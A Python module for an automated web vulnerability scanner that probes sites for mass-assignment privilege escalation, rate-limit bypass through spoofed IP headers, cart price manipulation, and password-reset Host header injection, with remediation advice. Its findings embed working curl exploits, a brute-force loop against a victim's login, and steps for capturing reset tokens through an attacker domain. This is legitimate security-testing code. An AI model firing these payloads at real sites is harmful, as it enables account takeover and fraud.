"""
Business Logic & Authenticated Scan Checks
- Privilege Escalation
- Mass Assignment
- Price/Quantity Manipulation
- Account Takeover vectors
- IDOR with auth context
- Rate limit bypass on auth endpoints
"""

import asyncio
import json
from urllib.parse import urljoin
from rich.console import Console
from core.models import Vulnerability, Severity

console = Console()


class BusinessLogicScanner:
    def __init__(self, http_client):
        self.http_client = http_client

    async def _check_privilege_escalation(
        self, base_url: str
    ) -> list[Vulnerability]:
        """
        Privilege escalation attempt using admin/role parameters
        """
        vulns = []

        # Common admin endpoints
        admin_paths = [
            "/api/user/update", "/api/profile/update",
            "/api/users/me", "/api/account/update",
            "/user/settings", "/profile/edit",
            "/api/v1/user", "/api/v2/user",
        ]

        # Mass assignment payloads
        privesc_payloads = [
            {"role": "admin"},
            {"is_admin": True},
            {"admin": True},
            {"role": "administrator"},
            {"user_type": "admin"},
            {"permissions": ["admin", "superuser"]},
            {"access_level": 0},
            {"privilege": "root"},
            {"group": "admin"},
        ]

        for path in admin_paths:
            url = urljoin(base_url.rstrip("/") + "/", path.lstrip("/"))

            for payload in privesc_payloads[:3]:
                resp = await self.http_client.post(
                    url,
                    json=payload,
                    headers={"Content-Type": "application/json"},
                )
                if not resp:
                    continue

                # 200 OK + admin appears in the response
                if resp.status_code == 200:
                    body = resp.text.lower()
                    if any(
                        kw in body
                        for kw in ["admin", "true", "role", "privilege", "permission"]
                    ):
                        vulns.append(Vulnerability(
                            vuln_type="Business Logic",
                            url=url,
                            severity=Severity.CRITICAL,
                            cvss_score=9.8,
                            title=f"Mass Assignment / Privilege Escalation — {path}",
                            description=(
                                f"The POST {path} endpoint allows a user to change their own "
                                f"role/permission. "
                                f"Payload: {json.dumps(payload)}"
                            ),
                            evidence=(
                                f"POST {url}\n"
                                f"Body: {json.dumps(payload)}\n"
                                f"Response: {resp.status_code} — {resp.text[:200]}"
                            ),
                            exploitation=(
                                f"curl -X POST '{url}' \\\n"
                                f"  -H 'Content-Type: application/json' \\\n"
                                f"  -H 'Cookie: YOUR_SESSION' \\\n"
                                f"  -d '{json.dumps(payload)}'\n\n"
                                f"Then check /api/users/me to see if the role changed"
                            ),
                            remediation=(
                                "1. Server-side whitelist — only accept allowed fields\n"
                                "2. Never accept role/permission from the client\n"
                                "3. Mass assignment protection (Laravel: $guarded, Rails: strong params)\n"
                                "4. Use the DTO pattern"
                            ),
                            curl_poc=(
                                f"curl -X POST '{url}' "
                                f"-H 'Content-Type: application/json' "
                                f"-d '{json.dumps(payload)}'"
                            ),
                            cwe_id="CWE-915",
                        ))
                        break

        return vulns

    async def _check_rate_limit_bypass(
        self, base_url: str
    ) -> list[Vulnerability]:
        """Check for rate limit bypass on auth endpoints"""
        vulns = []

        auth_endpoints = [
            ("/api/auth/login", {"email": "test@test.com", "password": "test"}),
            ("/login", {"username": "admin", "password": "test"}),
            ("/api/forgot-password", {"email": "test@test.com"}),
            ("/api/verify-otp", {"otp": "000000"}),
            ("/api/reset-password", {"token": "test", "password": "test"}),
        ]

        bypass_headers = [
            {"X-Forwarded-For": "1.2.3.{}"},
            {"X-Real-IP": "10.0.0.{}"},
            {"CF-Connecting-IP": "192.168.1.{}"},
            {"True-Client-IP": "172.16.0.{}"},
        ]

        for path, payload in auth_endpoints:
            url = urljoin(base_url.rstrip("/") + "/", path.lstrip("/"))

            # 5 normal requests — is there a rate limit?
            blocked = False
            for i in range(5):
                resp = await self.http_client.post(url, json=payload)
                if resp and resp.status_code == 429:
                    blocked = True
                    break
                await asyncio.sleep(0.1)

            if not blocked:
                continue  # No rate limit — no need to bypass

            # There's a rate limit — attempt bypass
            for header_template in bypass_headers:
                header_key = list(header_template.keys())[0]
                bypassed = False

                for i in range(5):
                    header_val = list(header_template.values())[0].format(i + 10)
                    resp = await self.http_client.post(
                        url,
                        json=payload,
                        headers={header_key: header_val},
                    )
                    if resp and resp.status_code != 429:
                        bypassed = True
                    await asyncio.sleep(0.1)

                if bypassed:
                    vulns.append(Vulnerability(
                        vuln_type="Business Logic",
                        url=url,
                        severity=Severity.HIGH,
                        cvss_score=7.5,
                        title=f"Rate Limit Bypass — {header_key} — {path}",
                        description=(
                            f"The {path} endpoint has a rate limit, "
                            f"but it can be bypassed by changing the '{header_key}' header. "
                            f"This opens the door to brute-force attacks."
                        ),
                        evidence=(
                            f"Normal 5 req → got 429\n"
                            f"5 req with {header_key} → bypass worked"
                        ),
                        exploitation=(
                            f"# Brute force with Hydra:\n"
                            f"for i in $(seq 1 1000); do\n"
                            f"  curl -X POST '{url}' \\\n"
                            f"    -H '{header_key}: 1.2.3.$i' \\\n"
                            f"    -H 'Content-Type: application/json' \\\n"
                            f"    -d '{{\"email\":\"victim@target.com\","
                            f"\"password\":\"WORDLIST_ENTRY\"}}'\n"
                            f"done"
                        ),
                        remediation=(
                            "1. Apply the rate limit per user/account instead of by IP\n"
                            "2. Don't trust proxy headers\n"
                            "3. Only accept X-Forwarded-For from a trusted proxy\n"
                            "4. Add a CAPTCHA\n"
                            "5. Apply account lockout"
                        ),
                        curl_poc=(
                            f"curl -X POST '{url}' "
                            f"-H '{header_key}: 1.2.3.100' "
                            f"-H 'Content-Type: application/json' "
                            f"-d '{json.dumps(payload)}'"
                        ),
                        cwe_id="CWE-307",
                    ))
                    break

        return vulns

    async def _check_price_manipulation(
        self, base_url: str
    ) -> list[Vulnerability]:
        """Price/quantity manipulation — e-commerce logic"""
        vulns = []

        cart_endpoints = [
            "/api/cart/add",
            "/api/cart/update",
            "/cart/item",
            "/api/order/create",
            "/shop/cart",
        ]

        # Negative/zero price/quantity
        manipulation_payloads = [
            {"quantity": -1, "price": 1},
            {"quantity": 0, "price": 0},
            {"amount": -100},
            {"price": 0.001},
            {"quantity": 9999999},
            {"discount": 100},
            {"coupon_value": 9999},
        ]

        for path in cart_endpoints:
            url = urljoin(base_url.rstrip("/") + "/", path.lstrip("/"))

            for payload in manipulation_payloads:
                resp = await self.http_client.post(
                    url,
                    json=payload,
                    headers={"Content-Type": "application/json"},
                )
                if not resp:
                    continue

                if resp.status_code == 200:
                    body = resp.text.lower()
                    # Success indicator — no error
                    if not any(
                        err in body
                        for err in ["error", "invalid", "failed", "rejected", "bad request"]
                    ):
                        vulns.append(Vulnerability(
                            vuln_type="Business Logic",
                            url=url,
                            severity=Severity.HIGH,
                            cvss_score=8.5,
                            title=f"Price/Quantity Manipulation — {path}",
                            description=(
                                f"The {path} endpoint does not validate negative/zero/"
                                f"excessively large values. "
                                f"Free or heavily discounted purchases may be possible."
                            ),
                            evidence=(
                                f"POST {url}\n"
                                f"Payload: {json.dumps(payload)}\n"
                                f"Response: 200 OK, no error"
                            ),
                            exploitation=(
                                f"1. Add a product to the cart\n"
                                f"2. Send this request:\n"
                                f"curl -X POST '{url}' \\\n"
                                f"  -H 'Cookie: YOUR_SESSION' \\\n"
                                f"  -H 'Content-Type: application/json' \\\n"
                                f"  -d '{json.dumps(payload)}'\n"
                                f"3. Complete the checkout process"
                            ),
                            remediation=(
                                "1. Server-side validation — price/quantity cannot be negative\n"
                                "2. Don't accept price from the client — fetch it from the DB\n"
                                "3. Apply a min/max limit\n"
                                "4. Recalculate the price at checkout"
                            ),
                            curl_poc=(
                                f"curl -X POST '{url}' "
                                f"-H 'Content-Type: application/json' "
                                f"-d '{json.dumps(payload)}'"
                            ),
                            cwe_id="CWE-840",
                        ))
                        break

        return vulns

    async def _check_account_takeover_vectors(
        self, base_url: str
    ) -> list[Vulnerability]:
        """Check account takeover vectors"""
        vulns = []

        # Password reset endpoint analizi
        reset_paths = [
            "/api/forgot-password",
            "/api/reset-password",
            "/forgot-password",
            "/account/reset",
        ]

        for path in reset_paths:
            url = urljoin(base_url.rstrip("/") + "/", path.lstrip("/"))

            # Host header injection attempt
            resp = await self.http_client.post(
                url,
                json={"email": "test@test.com"},
                headers={
                    "Host": "evil.com",
                    "Content-Type": "application/json",
                },
            )
            if resp and resp.status_code in [200, 201]:
                vulns.append(Vulnerability(
                    vuln_type="Business Logic",
                    url=url,
                    severity=Severity.HIGH,
                    cvss_score=8.0,
                    title=f"Password Reset — Potential Host Header Injection — {path}",
                    description=(
                        "If the password reset endpoint builds the reset link from "
                        "the Host header, an attacker can redirect the "
                        "reset token to their own domain."
                    ),
                    evidence=(
                        f"POST {url}\n"
                        f"Host: evil.com\n"
                        f"Response: {resp.status_code}"
                    ),
                    exploitation=(
                        f"1. Know the victim's email\n"
                        f"2. Send this request:\n"
                        f"curl -X POST '{url}' \\\n"
                        f"  -H 'Host: attacker.com' \\\n"
                        f"  -H 'Content-Type: application/json' \\\n"
                        f"  -d '{{\"email\":\"victim@target.com\"}}'\n"
                        f"3. The reset email will be sent pointing to the attacker.com domain\n"
                        f"4. Grab the token and change the password"
                    ),
                    remediation=(
                        "1. Build the reset URL from config — not from the Host header\n"
                        "2. Apply an allowed-host whitelist\n"
                        "3. Django: ALLOWED_HOSTS, Rails: config.hosts"
                    ),
                    curl_poc=(
                        f"curl -X POST '{url}' "
                        f"-H 'Host: evil.com' "
                        f"-H 'Content-Type: application/json' "
                        f"-d '{{\"email\":\"victim@target.com\"}}'"
                    ),
                    cwe_id="CWE-640",
                ))

        return vulns

    async def _check_response_manipulation(
        self, base_url: str
    ) -> list[Vulnerability]:
        """
        Response-based auth bypass — flipping false/true
        """
        vulns = []

        # This check is more effective done manually with Burp Suite
        # Let's give a hint for automated detection

        check_paths = [
            "/api/admin", "/api/admin/users",
            "/api/users/all", "/admin/dashboard",
        ]

        for path in check_paths:
            url = urljoin(base_url.rstrip("/") + "/", path.lstrip("/"))
            resp = await self.http_client.get(url)

            if not resp:
                continue

            # Returns 401/403 but the JSON body has admin data?
            if resp.status_code in [401, 403]:
                try:
                    data = resp.json()
                    body_str = str(data).lower()
                    if any(
                        kw in body_str
                        for kw in ["users", "email", "admin", "password", "token"]
                    ):
                        vulns.append(Vulnerability(
                            vuln_type="Business Logic",
                            url=url,
                            severity=Severity.HIGH,
                            cvss_score=7.5,
                            title=f"Data Leak in Error Response — {path}",
                            description=(
                                f"The endpoint returns {resp.status_code} "
                                f"but the response body contains sensitive data. "
                                f"Authorization appears to be enforced only in the UI."
                            ),
                            evidence=(
                                f"HTTP {resp.status_code}\n"
                                f"Body: {str(data)[:300]}"
                            ),
                            exploitation=(
                                f"curl -s '{url}' — "
                                f"data is visible even though the status is {resp.status_code}.\n"
                                f"Intercept with Burp Suite and change the status to 200."
                            ),
                            remediation=(
                                "1. Enforce authorization server-side — not only on the frontend\n"
                                "2. Don't return data in error responses\n"
                                "3. Protect all endpoints with middleware"
                            ),
                            curl_poc=f"curl -s '{url}'",
                            cwe_id="CWE-284",
                        ))
                except Exception:
                    pass

        return vulns

    async def scan(self, base_url: str) -> list[Vulnerability]:
        console.print(
            f"\n[bold cyan]🧠 Business Logic scan:[/bold cyan] {base_url[:60]}"
        )
        vulns = []

        tasks = [
            self._check_privilege_escalation(base_url),
            self._check_rate_limit_bypass(base_url),
            self._check_price_manipulation(base_url),
            self._check_account_takeover_vectors(base_url),
            self._check_response_manipulation(base_url),
        ]

        results = await asyncio.gather(*tasks, return_exceptions=True)

        for r in results:
            if isinstance(r, list):
                vulns.extend(r)
                for v in r:
                    console.print(
                        f"  {v.severity.emoji} "
                        f"[bold]Business Logic:[/bold] {v.title}"
                    )

        return vulns